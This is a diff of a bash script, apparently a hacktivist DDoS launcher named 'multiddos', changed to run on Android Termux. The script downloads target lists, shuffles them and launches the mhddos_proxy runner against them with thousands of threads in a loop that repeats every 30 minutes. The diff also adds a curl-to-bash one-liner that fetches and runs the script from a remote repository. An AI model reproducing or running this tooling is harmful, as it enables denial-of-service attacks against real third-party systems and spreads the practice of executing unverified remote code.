@@ -1,11 +1,13 @@
 #!/bin/bash
-# curl -O https://raw.githubusercontent.com/KarboDuck/multiddos/main/multiddos.sh && bash multiddos.sh
+# Modified for work with Android termux https://github.com/termux/termux-app/releases
+# curl -Lk https://raw.githubusercontent.com/ignitedevua/multiddos/main/multiddos.sh | bash --lite -g
 clear && echo -e "Loading... v0.9a\n"
 sudo apt-get update -q -y #>/dev/null 2>&1
 sudo apt-get install -q -y tmux toilet python3 python3-pip 
 pip install --upgrade pip >/dev/null 2>&1
 rm -rf ~/multidd; mkdir ~/multidd; cd ~/multidd #delete old folder; create new and cd inside
-sudo rm -f /var/tmp/*uaripper #remove previous targets under root
+rm -rf ~/tmp/ 2>&1
+mkdir ~/tmp/
 
 typing_on_screen (){
     tput setaf 2 &>/dev/null # green
@@ -31,9 +33,9 @@ if [[ $t_proxy_manual != "on" ]]; then export proxy_threads="2000"; fi # same fo
 
 ### prepare target files (main and secondary)
 prepare_targets_and_banner () {
-export targets_curl="/var/tmp/curl.uaripper"
-export targets_uniq="/var/tmp/uniq.uaripper"
-export targets_lite="/var/tmp/lite.uaripper"
+export targets_curl=~"/tmp/curl.uaripper"
+export targets_uniq=~"/tmp/uniq.uaripper"
+export targets_lite=~"/tmp/lite.uaripper"
 rm -f /var/tmp/*uaripper #remove previous copies
 
 # read targets from github, exclude comments and empty lines, put valid addresses on new line
@@ -52,9 +54,7 @@ cat $targets_curl | sort | uniq | sort -R > $targets_uniq
 
 # Print greetings and number of targets; yes, utility name "toilet" is unfortunate
 clear
-toilet -t --metal "Український"
-toilet -t --metal "   жнець"
-toilet -t --metal " MULTIDDOS"
+echo " :::: MULTIDDOS ::::\n"
 typing_on_screen 'Шукаю завдання...' ; sleep 0.5
 echo -e "\n\nTotal targets found:" "\x1b[32m $(cat $targets_curl | wc -l)\x1b[m" && sleep 0.1
 echo -e "Uniq targets:" "\x1b[32m $(cat $targets_uniq | wc -l)\x1b[m" && sleep 0.1
@@ -139,10 +139,10 @@ while true; do
         tail -n 2000 $targets_uniq > $targets_lite
         AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c $targets_lite $methods $args_to_pass -t 5000 &
     else
-        cd /var/tmp/; split -n l/2 --additional-suffix=.uaripper $targets_uniq; cd - #split targets in 2
-        AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c /var/tmp/xaa.uaripper $methods $threads $args_to_pass &
+        cd ~/tmp/; split -n l/2 --additional-suffix=.uaripper $targets_uniq; cd - #split targets in 2
+        AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c ~/tmp/xaa.uaripper $methods $threads $args_to_pass &
         sleep 15 # to decrease load on cpu during simultaneous start
-        AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c /var/tmp/xab.uaripper $methods $threads $args_to_pass &
+        AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c ~/tmp/xab.uaripper $methods $threads $args_to_pass &
     fi
 sleep 30m
 prepare_targets_and_banner
